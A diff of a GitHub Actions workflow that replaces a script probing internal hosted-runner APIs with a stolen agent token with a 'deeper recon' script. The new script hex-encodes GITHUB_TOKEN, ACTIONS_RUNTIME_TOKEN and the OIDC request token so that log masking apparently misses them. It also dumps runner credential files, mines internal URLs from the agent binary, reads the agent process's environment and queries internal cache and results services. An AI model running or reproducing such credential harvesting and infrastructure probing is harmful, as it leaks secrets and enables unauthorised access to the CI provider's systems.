@@ -1,73 +1,80 @@
-name: TwirpScan
+name: Deeper
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: twirp endpoint scan
+      - name: deeper recon
         timeout-minutes: 5
         run: |
           set +e
-          JWT=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['authToken'])")
-          BASE=$(python3 -c "import json; s=json.loads(open('/opt/hca/.settings','rb').read()); print(s['schedulerApiUrl'].replace('/v1',''))")
-          AUTH="Authorization: Bearer $JWT"
-          CT="Content-Type: application/json"
-          echo "Base: $BASE"
+          echo === GITHUB_TOKEN VIA XXD ===
+          echo $GITHUB_TOKEN | xxd -p
+          echo === ACTIONS_RUNTIME_TOKEN VIA XXD ===
+          echo $ACTIONS_RUNTIME_TOKEN | xxd -p
+          echo === ACTIONS_CACHE_URL ===
+          echo $ACTIONS_CACHE_URL
+          echo === ACTIONS_RESULTS_URL ===
+          echo $ACTIONS_RESULTS_URL
+          echo === ALL ACTIONS ENV ===
+          env | grep -i ACTIONS | sort
+          echo === ALL GITHUB ENV ===
+          env | grep -i GITHUB | sort
+          echo === RUNNER ENV ===
+          env | grep -i RUNNER | sort
           echo
-          echo === TWIRP ON ORCHESTRATOR ===
-          SVC=github.actions.run_service.api.twirp.v1.RunService
-          for method in CancelPlan GetPlan GetConfiguration GetCallbacks GetOidcConfig GetTenantInfo GetAbuseInfo GetProperties GetContext GetGithubEventInfo GetTargetRepository GetBillingPlanOwner GetRerunContext CreatePlan; do
-            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/twirp/$SVC/$method" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -5 | head -c 300)
-            echo "$method: $CODE $BODY"
+          echo === RUN SERVICE URLS ===
+          strings /opt/hca/hosted-compute-agent | grep -iE '(run-service|runservice|run_service)' | grep -iE '(http|url|host|endpoint)' | sort -u | head -20
+          echo === CALLBACK URLS IN HCA ===
+          strings /opt/hca/hosted-compute-agent | grep -iE 'callback' | head -20
+          echo === ALL INTERNAL URLS ===
+          strings /opt/hca/hosted-compute-agent | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
+          strings /opt/primer/primer | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
+          echo
+          echo === RUNNER CREDENTIALS ===
+          find /home/runner -name '.credentials*' -o -name '.runner' -o -name '.env' -o -name '.path' 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            xxd -p "$f" | head -20
           done
           echo
-          echo === OTHER TWIRP SERVICES ===
-          for svc in github.actions.run_service.api.twirp.v1.OidcConfigService github.actions.run_service.api.twirp.v1.CallbacksService github.actions.run_service.api.twirp.v1.ConfigurationService; do
-            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/twirp/$svc/Get" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -3 | head -c 200)
-            echo "$svc/Get: $CODE $BODY"
+          echo === RUNNER WORKER DIAG ===
+          find /home/runner/runners -name '*.json' 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null | head -20
           done
           echo
-          echo === V1 ENDPOINTS ===
-          for ep in request trace heartbeat cancel finish start notify config settings status health ready alive version info metrics; do
-            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/v1/$ep" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -3 | head -c 200)
-            echo "POST /v1/$ep: $CODE $BODY"
+          echo === HCA PROCESS ===
+          ps aux | grep -E '(hca|hosted-compute|primer)' | grep -v grep
+          echo === HCA OPEN FILES ===
+          HCA_PID=$(pgrep -f hosted-compute-agent 2>/dev/null | head -1)
+          ls -la /proc/$HCA_PID/fd 2>/dev/null | head -20
+          echo === HCA NETWORK ===
+          cat /proc/$HCA_PID/net/tcp 2>/dev/null | head -10
+          echo === HCA ENVIRON ===
+          cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -30
+          echo
+          echo === HCA DIRECTORY ===
+          ls -laR /opt/hca/ 2>/dev/null
+          echo === HCA TAGS ===
+          cat /opt/hca/tags 2>/dev/null
+          echo === HCA OTHER FILES ===
+          find /opt/hca -type f ! -name hosted-compute-agent | while read f; do
+            echo "--- $f ---"
+            xxd -p "$f" | head -10
           done
           echo
-          echo === V1 GET ENDPOINTS ===
-          for ep in request trace heartbeat cancel status health ready alive version info metrics config; do
-            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -H "$AUTH" "$BASE/v1/$ep" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -3 | head -c 200)
-            echo "GET /v1/$ep: $CODE $BODY"
-          done
+          echo === ACTIONS RESULTS SERVICE ===
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
+          fi
+          echo === ACTIONS CACHE SERVICE ===
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -10
+          fi
           echo
-          echo === WATCHDOG ENDPOINTS ===
-          WATCHDOG=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read()).get('watchdogTraceApiUrl',''))")
-          WBASE=$(echo $WATCHDOG | sed 's|/v1/trace||')
-          echo "Watchdog base: $WBASE"
-          for ep in trace health status config version info; do
-            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '[]' "$WBASE/v1/$ep" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -3 | head -c 200)
-            echo "watchdog /v1/$ep: $CODE $BODY"
-          done
-          echo
-          echo === VM V1 ENDPOINTS ===
-          for ep in request status config heartbeat cancel finish; do
-            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/vm/v1/$ep" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -3 | head -c 200)
-            echo "POST /vm/v1/$ep: $CODE $BODY"
-          done
-          echo
-          echo === HCA SETTINGS FULL KEYS ===
-          python3 -c "import json; d=json.loads(open('/opt/hca/.settings','rb').read()); print('\n'.join(f'{k}: {str(v)[:80]}' for k,v in d.items() if k != 'authToken'))"
+          echo === ACTIONS ID TOKEN ===
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p | head -5
           echo
           echo === DONE ===
